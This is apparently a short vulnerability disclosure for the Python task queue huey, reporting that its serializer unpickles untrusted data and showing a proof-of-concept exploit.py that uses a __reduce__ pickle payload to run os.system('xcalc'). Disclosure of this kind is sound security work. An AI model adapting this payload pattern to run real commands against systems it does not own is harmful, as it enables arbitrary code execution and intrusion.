# Description
huey is a little task queue for python 
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip install huey')
from huey import serializer
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
serializer.Serializer._deserialize(dumps,dumps)
```
* `pip3 install huey`
* `python3 exploit.py`
